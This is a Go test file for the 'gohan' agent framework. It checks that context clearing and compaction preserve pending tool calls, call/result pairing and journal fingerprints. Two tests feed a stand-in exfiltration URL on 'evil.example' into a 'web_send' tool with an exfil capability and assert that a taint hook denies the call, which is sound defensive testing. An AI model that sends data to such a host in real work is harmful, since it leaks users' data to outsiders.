package gohan_test

import (
	"context"
	"encoding/json"
	"encoding/json/jsontext"
	"slices"
	"sync"
	"testing"
	"time"

	gohan "github.com/victorzhuk/gohan/core"
	"github.com/victorzhuk/gohan/core/stores"
	"github.com/victorzhuk/gohan/core/types"
	stdcontext "github.com/victorzhuk/gohan/std/context"
	stdguard "github.com/victorzhuk/gohan/std/guard"
	"github.com/victorzhuk/gohan/std/taint"
)

const invariantClearedMarker = "[tool result cleared]"

const invariantSecretURL = "https://evil.example/collect?k=abcdefgh12345678"

// charCountEstimator sizes a request by its tool result text, so a clearing
// that shortens results lowers the estimate and the fire condition sees a
// positive delta.
type charCountEstimator struct{}

func (charCountEstimator) Estimate(req types.ModelRequest, _ types.Caps) int {
	n := 0
	for _, msg := range req.Messages {
		for _, b := range msg.Blocks {
			if r, ok := b.(types.ToolResult); ok {
				for _, c := range r.Content {
					if txt, ok := c.(types.Text); ok {
						n += len(txt.Text)
					}
				}
			}
		}
	}
	return n
}

func invariantClearing(keep int) stores.ContextPolicy {
	return stores.ContextPolicy{
		Projections: []stores.Projection{stdcontext.NewClearToolResults(
			stdcontext.WithClearEstimator(charCountEstimator{}),
			stdcontext.WithClearRatio(0.9),
			func(c *stdcontext.ClearToolResults) { c.Keep = keep },
		)},
	}
}

func invariantAppend(t *testing.T, log stores.SessionLog, sessionID string, msgs ...types.Message) {
	t.Helper()
	ctx := types.WithPrincipal(context.Background(), types.Principal{Tenant: "t1", Subject: "u1"})
	h, err := log.Load(ctx, sessionID)
	if err != nil {
		t.Fatalf("load before append: %v", err)
	}
	if _, err := log.Append(ctx, sessionID, h.Version, msgs...); err != nil {
		t.Fatalf("append turns: %v", err)
	}
}

func invariantToolPair(useID, name, result string) []types.Message {
	return []types.Message{
		{Role: types.RoleAssistant, Blocks: []types.Block{types.ToolUse{ID: useID, Name: name, Args: jsontext.Value(`{"id":"` + useID + `"}`)}}},
		{Role: types.RoleUser, Blocks: []types.Block{
			types.ToolResult{
				BlockBase: types.BlockBase{Origin: types.Origin{Kind: types.OriginTool, Name: name}},
				ID:        useID,
				Content:   []types.Block{types.Text{Text: result}},
				Outcome:   types.Succeeded,
			},
		}},
	}
}

func invariantRequestUses(t *testing.T, m *recordingModel) []types.ToolUse {
	t.Helper()
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.requests) == 0 {
		t.Fatal("model received no request")
	}
	var uses []types.ToolUse
	for _, msg := range m.requests[0].Messages {
		for _, b := range msg.Blocks {
			if u, ok := b.(types.ToolUse); ok {
				uses = append(uses, u)
			}
		}
	}
	return uses
}

func TestProjectionPendingCallUntouched(t *testing.T) {
	model := &recordingModel{}
	log := newInterceptingLog(stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom)))
	_, conv := projectionStack(t, model, log, invariantClearing(1))
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", invariantToolPair("use-big", "doc_read", " filler filler filler filler filler filler filler filler")...)
	invariantAppend(t, log, "s1", types.Message{
		Role:   types.RoleAssistant,
		Blocks: []types.Block{types.ToolUse{ID: "use-pend", Name: "doc_write", Args: jsontext.Value(`{"id":"p1"}`)}},
	})
	sendOne(t, conv, "go")

	var pending []types.ToolUse
	for _, u := range invariantRequestUses(t, model) {
		if u.ID == "use-pend" {
			pending = append(pending, u)
		}
	}
	if len(pending) != 1 {
		t.Fatalf("pending uses in request = %d, want exactly one", len(pending))
	}
	if pending[0].Name != "doc_write" || string(pending[0].Args) != `{"id":"p1"}` {
		t.Fatalf("pending use = %s %s, want the recorded identity doc_write {\"id\":\"p1\"}", pending[0].Name, pending[0].Args)
	}
	for _, msg := range model.requests[0].Messages {
		for _, b := range msg.Blocks {
			if r, ok := b.(types.ToolResult); ok && r.ID == "use-pend" {
				t.Fatal("a pending use grew a tool result in the projected view")
			}
		}
	}
}

func TestProjectionAdjacencyIntact(t *testing.T) {
	model := &recordingModel{}
	log := newInterceptingLog(stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom)))
	_, conv := projectionStack(t, model, log, invariantClearing(1))
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", invariantToolPair("use-mid", "doc_read", "mid filler filler filler filler filler filler filler")...)
	invariantAppend(t, log, "s1", invariantToolPair("use-big", "doc_read", "big filler filler filler filler filler filler filler")...)
	sendOne(t, conv, "go")

	m := model.requests[0].Messages
	type pair struct{ use, result string }
	var pairs []pair
	for i, msg := range m {
		for _, b := range msg.Blocks {
			if u, ok := b.(types.ToolUse); ok {
				if i+1 >= len(m) {
					t.Fatalf("tool use %s has no following message", u.ID)
				}
				found := false
				for _, nb := range m[i+1].Blocks {
					if r, ok := nb.(types.ToolResult); ok && r.ID == u.ID {
						pairs = append(pairs, pair{u.ID, r.ID})
						found = true
					}
				}
				if !found {
					t.Fatalf("tool use %s lost its result in the adjacent message", u.ID)
				}
			}
		}
	}
	want := []pair{{"use-read", "use-read"}, {"use-write", "use-write"}, {"use-mid", "use-mid"}, {"use-big", "use-big"}}
	if !slices.Equal(pairs, want) {
		t.Fatalf("adjacency pairs = %v, want %v in history order", pairs, want)
	}
	cleared := 0
	for _, msg := range m {
		for _, b := range msg.Blocks {
			if r, ok := b.(types.ToolResult); ok && len(r.Content) == 1 {
				if txt, ok := r.Content[0].(types.Text); ok && txt.Text == invariantClearedMarker {
					cleared++
				}
			}
		}
	}
	if cleared == 0 {
		t.Fatal("no result was cleared, the firing precondition did not hold")
	}
}

type taintProbeProjection struct {
	mu     sync.Mutex
	hook   types.TaintHook
	spec   types.ToolSpec
	arg    string
	action types.TaintAction
	found  bool
}

func (p *taintProbeProjection) Project(ctx context.Context, h stores.History, _ types.ModelProfile) (stores.History, error) {
	action, taints := p.hook(ctx, p.spec, jsontext.Value(p.arg))
	p.mu.Lock()
	p.action = action
	p.found = len(taints) == 1 && taints[0].Match == invariantSecretURL
	p.mu.Unlock()
	return h, nil
}

func TestProjectionTaintOverFullLog(t *testing.T) {
	hook, err := taint.New(taint.Default(), nil)
	if err != nil {
		t.Fatalf("build taint hook: %v", err)
	}
	probe := &taintProbeProjection{
		hook: hook,
		spec: types.ToolSpec{Name: "web_send", Capabilities: types.Capabilities{Exfil: true}},
		arg:  `{"url":"` + invariantSecretURL + `"}`,
	}
	model := &recordingModel{}
	log := newInterceptingLog(stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom)))
	policy := invariantClearing(1)
	policy.Projections = append(policy.Projections, probe)
	_, conv := projectionStack(t, model, log, policy)
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", invariantToolPair("use-secret", "web_fetch", "page text "+invariantSecretURL+" more")...)
	invariantAppend(t, log, "s1", invariantToolPair("use-tail", "doc_read", "tail filler filler filler filler filler filler filler filler")...)
	sendOne(t, conv, "go")

	probe.mu.Lock()
	action, found := probe.action, probe.found
	probe.mu.Unlock()
	if action != types.TaintDeny || !found {
		t.Fatalf("taint hook over the projected turn = %v match=%v, want deny on the full-log window", action, found)
	}
	sawURL := false
	for _, msg := range model.requests[0].Messages {
		for _, b := range msg.Blocks {
			if txt, ok := b.(types.Text); ok && txt.Text == invariantSecretURL {
				sawURL = true
			}
			if r, ok := b.(types.ToolResult); ok && r.ID == "use-secret" {
				if txt, ok := r.Content[0].(types.Text); ok && txt.Text != invariantClearedMarker {
					t.Fatalf("secret result content = %q, want the cleared marker", txt.Text)
				}
			}
		}
	}
	if sawURL {
		t.Fatal("the projected view still carried the secret text, the firing precondition did not hold")
	}
}

func invariantJournalStack(t *testing.T, model *recordingModel, log stores.SessionLog, journal stores.Journal, policy stores.ContextPolicy) gohan.Conversation {
	t.Helper()
	runs := stores.NewMemoryRuns(
		stores.WithMemoryRunClock(time.Now),
		stores.WithMemoryRunInfo(func(ctx context.Context) (types.RunInfo, bool) {
			p, ok := types.PrincipalFrom(ctx)
			return types.RunInfo{Principal: p}, ok
		}),
	)
	stack, err := gohan.Build(
		gohan.WithStores(stores.Stores{SessionLog: log, Journal: journal}),
		gohan.WithModels(model),
		gohan.WithNativeAgent(gohan.NativeSpec{
			Request:  gohan.FlowRequest{Name: "chat"},
			Profile:  "native",
			Assemble: passthroughAssemble,
		}),
		gohan.WithContextPolicy(policy),
	)
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	conv, err := gohan.NewNativeConversation(stack, "chat",
		gohan.WithConversationRuns(runs),
		gohan.WithConversationEventLog(stores.NewMemoryEventLog(stores.WithMemoryEventLogClock(time.Now))),
	)
	if err != nil {
		t.Fatalf("new native conversation: %v", err)
	}
	return conv
}

func TestProjectionJournalFingerprintUnchanged(t *testing.T) {
	model := &recordingModel{}
	log := newInterceptingLog(stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom)))
	journal := stores.NewMemoryJournal(stores.WithMemoryJournalClock(time.Now))
	conv := invariantJournalStack(t, model, log, journal, invariantClearing(1))
	h := seededHistory(t, log, "s1")

	type call struct {
		id   string
		tool string
		args jsontext.Value
	}
	var calls []call
	for _, msg := range h.Messages {
		for _, b := range msg.Blocks {
			if u, ok := b.(types.ToolUse); ok {
				calls = append(calls, call{id: u.ID, tool: u.Name, args: u.Args})
			}
		}
	}
	if len(calls) != 2 {
		t.Fatalf("seeded calls = %d, want two", len(calls))
	}
	ctx := types.WithPrincipal(context.Background(), types.Principal{Tenant: "t1", Subject: "u1"})
	fingerprintOf := func(c call) stores.Fingerprint {
		return gohan.ToolFingerprint(types.ToolSpec{Name: c.tool}, json.RawMessage(c.args))
	}
	for _, c := range calls {
		k := types.CallKey{SessionID: "s1", CallID: c.id}
		if _, _, err := journal.Reserve(ctx, k, c.tool, fingerprintOf(c), json.RawMessage(c.args)); err != nil {
			t.Fatalf("reserve %s: %v", c.id, err)
		}
	}

	sendOne(t, conv, "go")

	for _, c := range calls {
		fresh, err := log.Load(ctx, "s1")
		if err != nil {
			t.Fatalf("reload after send: %v", err)
		}
		var stored *call
		for _, msg := range fresh.Messages {
			for _, b := range msg.Blocks {
				if u, ok := b.(types.ToolUse); ok && u.ID == c.id {
					stored = &call{id: u.ID, tool: u.Name, args: u.Args}
				}
			}
		}
		if stored == nil {
			t.Fatalf("call %s vanished from the session log", c.id)
		}
		if fingerprintOf(*stored) != fingerprintOf(c) {
			t.Fatalf("fingerprint of %s changed across the firing", c.id)
		}
		entries, err := journal.ByFingerprint(ctx, "s1", fingerprintOf(c))
		if err != nil {
			t.Fatalf("by fingerprint %s: %v", c.id, err)
		}
		if len(entries) != 1 || entries[0].Key != c.id || entries[0].Tool != c.tool {
			t.Fatalf("journal lookup for %s = %+v, want the reserved entry under its own fingerprint", c.id, entries)
		}
		if string(entries[0].Args) != string(c.args) {
			t.Fatalf("journal args for %s = %s, want %s", c.id, entries[0].Args, c.args)
		}
	}
}

// overEstimator answers one token for every request, so the compaction
// trigger fires on the first assembled turn regardless of content: the
// native fixture profile carries a zero window, so its budget limit is zero.
type overEstimator struct{}

func (overEstimator) Estimate(types.ModelRequest, types.Caps) int { return 1 }

// viewDrop is the injected fallback the compaction view stack validates
// with; no summary is rejected in these scenarios, so it never runs.
type viewDrop struct{}

func (viewDrop) Project(_ context.Context, h stores.History, _ types.ModelProfile) (stores.History, error) {
	return h, nil
}

func (viewDrop) ValidateCompactionFallback(types.ModelProfile) error { return nil }

// viewSummarySource folds any prefix into one plain text block.
func viewSummarySource(context.Context, stores.History, types.ModelProfile) ([]types.Block, error) {
	return []types.Block{types.Text{Text: "view summary"}}, nil
}

// viewPolicy declares the Summarize compactor over the given projections.
func viewPolicy(projections ...stores.Projection) stores.ContextPolicy {
	return stores.ContextPolicy{
		Compactor:   stdcontext.NewSummarize(stdcontext.WithSummarizeSource(viewSummarySource)),
		Projections: projections,
	}
}

// compactionViewStack builds one native conversation whose compactor fires
// on the first assembled turn.
func compactionViewStack(t *testing.T, model *recordingModel, st stores.Stores, policy stores.ContextPolicy) gohan.Conversation {
	t.Helper()
	if st.Audit == nil {
		st.Audit = stores.NewMemoryAuditLog()
	}
	if st.EventLog == nil {
		st.EventLog = stores.NewMemoryEventLog(stores.WithMemoryEventLogClock(time.Now))
	}
	runs := stores.NewMemoryRuns(
		stores.WithMemoryRunClock(time.Now),
		stores.WithMemoryRunInfo(func(ctx context.Context) (types.RunInfo, bool) {
			p, ok := types.PrincipalFrom(ctx)
			return types.RunInfo{Principal: p}, ok
		}),
	)
	stack, err := gohan.Build(
		gohan.WithStores(st),
		gohan.WithModels(model),
		gohan.WithNativeAgent(gohan.NativeSpec{
			Request:       gohan.FlowRequest{Name: "chat"},
			Profile:       "native",
			Assemble:      passthroughAssemble,
			ContextPolicy: policy,
		}),
		gohan.WithEstimator(overEstimator{}),
		gohan.WithCompactionFallback(viewDrop{}),
		gohan.WithCompactionGuard(stdguard.NewContextGuard()),
	)
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	conv, err := gohan.NewNativeConversation(stack, "chat",
		gohan.WithConversationRuns(runs),
		gohan.WithConversationEventLog(stores.NewMemoryEventLog(stores.WithMemoryEventLogClock(time.Now))),
	)
	if err != nil {
		t.Fatalf("new native conversation: %v", err)
	}
	return conv
}

// viewSummaryHeads counts the summary-carrying system messages of one
// provider request.
func viewSummaryHeads(req types.ModelRequest) int {
	n := 0
	for _, msg := range req.Messages {
		if msg.Role != types.RoleSystem {
			continue
		}
		for _, b := range msg.Blocks {
			if _, ok := b.(types.Text); ok {
				n++
				break
			}
		}
	}
	return n
}

func TestCompactionViewPendingCall(t *testing.T) {
	model := &recordingModel{}
	log := stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom))
	conv := compactionViewStack(t, model, stores.Stores{SessionLog: log}, viewPolicy())
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", types.Message{
		Role:   types.RoleAssistant,
		Blocks: []types.Block{types.ToolUse{ID: "use-pend", Name: "doc_write", Args: jsontext.Value(`{"id":"p1"}`)}},
	})
	sendOne(t, conv, "go")

	pending, covered := 0, false
	for _, u := range invariantRequestUses(t, model) {
		if u.ID == "use-pend" {
			pending++
		}
		if u.ID == "use-read" || u.ID == "use-write" {
			covered = true
		}
	}
	if pending != 1 {
		t.Fatalf("pending uses in the collapsed view = %d, want exactly one", pending)
	}
	if covered {
		t.Fatal("the collapsed view leaked a covered tool call")
	}
	for _, msg := range model.requests[0].Messages {
		for _, b := range msg.Blocks {
			if r, ok := b.(types.ToolResult); ok && r.ID == "use-pend" {
				t.Fatal("a pending use grew a tool result in the collapsed view")
			}
		}
	}
	if n := viewSummaryHeads(model.requests[0]); n != 1 {
		t.Fatalf("collapsed view carries %d summary heads: want one", n)
	}
}

func TestCompactionViewAdjacency(t *testing.T) {
	model := &recordingModel{}
	log := stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom))
	conv := compactionViewStack(t, model, stores.Stores{SessionLog: log}, viewPolicy())
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", invariantToolPair("use-big", "doc_read", "big filler filler filler filler filler filler filler filler")...)
	invariantAppend(t, log, "s1", types.Message{
		Role:   types.RoleAssistant,
		Blocks: []types.Block{types.ToolUse{ID: "use-pend", Name: "doc_write", Args: jsontext.Value(`{"id":"p1"}`)}},
	})
	invariantAppend(t, log, "s1", invariantToolPair("use-tail", "doc_read", "tail filler filler filler filler filler filler filler filler")...)
	sendOne(t, conv, "go")

	m := model.requests[0].Messages
	type pair struct{ use, result string }
	var pairs []pair
	for i, msg := range m {
		for _, b := range msg.Blocks {
			u, ok := b.(types.ToolUse)
			if !ok {
				continue
			}
			if i+1 >= len(m) {
				t.Fatalf("tool use %s has no following message", u.ID)
			}
			found := false
			for _, nb := range m[i+1].Blocks {
				if r, ok := nb.(types.ToolResult); ok && r.ID == u.ID {
					pairs = append(pairs, pair{u.ID, r.ID})
					found = true
				}
			}
			if u.ID == "use-pend" {
				if found {
					t.Fatal("a pending use grew a result in the collapsed view")
				}
				continue
			}
			if !found {
				t.Fatalf("tool use %s lost its result in the adjacent message", u.ID)
			}
		}
	}
	want := []pair{{"use-tail", "use-tail"}}
	if !slices.Equal(pairs, want) {
		t.Fatalf("adjacent pairs = %v, want %v: the covered pairs left whole and the tail pair kept whole", pairs, want)
	}
	if n := viewSummaryHeads(model.requests[0]); n != 1 {
		t.Fatalf("collapsed view carries %d summary heads: want one", n)
	}
}

func TestCompactionViewTaintOverFullLog(t *testing.T) {
	hook, err := taint.New(taint.Default(), nil)
	if err != nil {
		t.Fatalf("build taint hook: %v", err)
	}
	probe := &taintProbeProjection{
		hook: hook,
		spec: types.ToolSpec{Name: "web_send", Capabilities: types.Capabilities{Exfil: true}},
		arg:  `{"url":"` + invariantSecretURL + `"}`,
	}
	model := &recordingModel{}
	log := stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom))
	conv := compactionViewStack(t, model, stores.Stores{SessionLog: log}, viewPolicy(probe))
	seededHistory(t, log, "s1")
	invariantAppend(t, log, "s1", invariantToolPair("use-secret", "web_fetch", "page text "+invariantSecretURL+" more")...)
	invariantAppend(t, log, "s1", invariantToolPair("use-big", "doc_read", "big filler filler filler filler filler filler filler filler")...)
	sendOne(t, conv, "go")

	probe.mu.Lock()
	action, found := probe.action, probe.found
	probe.mu.Unlock()
	if action != types.TaintDeny || !found {
		t.Fatalf("taint hook over the compacted turn = %v match=%v, want deny on the full-log window", action, found)
	}
	for _, msg := range model.requests[0].Messages {
		for _, b := range msg.Blocks {
			if txt, ok := b.(types.Text); ok && txt.Text == invariantSecretURL {
				t.Fatal("the collapsed view still carried the secret, the compaction did not cover it")
			}
		}
	}
	if n := viewSummaryHeads(model.requests[0]); n != 1 {
		t.Fatalf("collapsed view carries %d summary heads: want one", n)
	}
}

func TestCompactionViewJournalFingerprintUnchanged(t *testing.T) {
	model := &recordingModel{}
	log := stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom))
	journal := stores.NewMemoryJournal(stores.WithMemoryJournalClock(time.Now))
	conv := compactionViewStack(t, model, stores.Stores{SessionLog: log, Journal: journal}, viewPolicy())
	h := seededHistory(t, log, "s1")

	type call struct {
		id   string
		tool string
		args jsontext.Value
	}
	var calls []call
	for _, msg := range h.Messages {
		for _, b := range msg.Blocks {
			if u, ok := b.(types.ToolUse); ok {
				calls = append(calls, call{id: u.ID, tool: u.Name, args: u.Args})
			}
		}
	}
	if len(calls) != 2 {
		t.Fatalf("seeded calls = %d, want two", len(calls))
	}
	ctx := types.WithPrincipal(context.Background(), types.Principal{Tenant: "t1", Subject: "u1"})
	fingerprintOf := func(c call) stores.Fingerprint {
		return gohan.ToolFingerprint(types.ToolSpec{Name: c.tool}, json.RawMessage(c.args))
	}
	for _, c := range calls {
		k := types.CallKey{SessionID: "s1", CallID: c.id}
		if _, _, err := journal.Reserve(ctx, k, c.tool, fingerprintOf(c), json.RawMessage(c.args)); err != nil {
			t.Fatalf("reserve %s: %v", c.id, err)
		}
	}

	sendOne(t, conv, "go")

	for _, msg := range model.requests[0].Messages {
		for _, b := range msg.Blocks {
			if u, ok := b.(types.ToolUse); ok && (u.ID == "use-read" || u.ID == "use-write") {
				t.Fatalf("covered call %s reached the provider, the invariant has no compaction to survive", u.ID)
			}
		}
	}
	for _, c := range calls {
		fresh, err := log.Load(ctx, "s1")
		if err != nil {
			t.Fatalf("reload after send: %v", err)
		}
		var stored *call
		for _, msg := range fresh.Messages {
			for _, b := range msg.Blocks {
				if u, ok := b.(types.ToolUse); ok && u.ID == c.id {
					stored = &call{id: u.ID, tool: u.Name, args: u.Args}
				}
			}
		}
		if stored == nil {
			t.Fatalf("call %s vanished from the session log", c.id)
		}
		if fingerprintOf(*stored) != fingerprintOf(c) {
			t.Fatalf("fingerprint of %s changed across the compaction", c.id)
		}
		entries, err := journal.ByFingerprint(ctx, "s1", fingerprintOf(c))
		if err != nil {
			t.Fatalf("by fingerprint %s: %v", c.id, err)
		}
		if len(entries) != 1 || entries[0].Key != c.id || entries[0].Tool != c.tool {
			t.Fatalf("journal lookup for %s = %+v, want the reserved entry under its own fingerprint", c.id, entries)
		}
		if string(entries[0].Args) != string(c.args) {
			t.Fatalf("journal args for %s = %s, want %s", c.id, entries[0].Args, c.args)
		}
	}
}
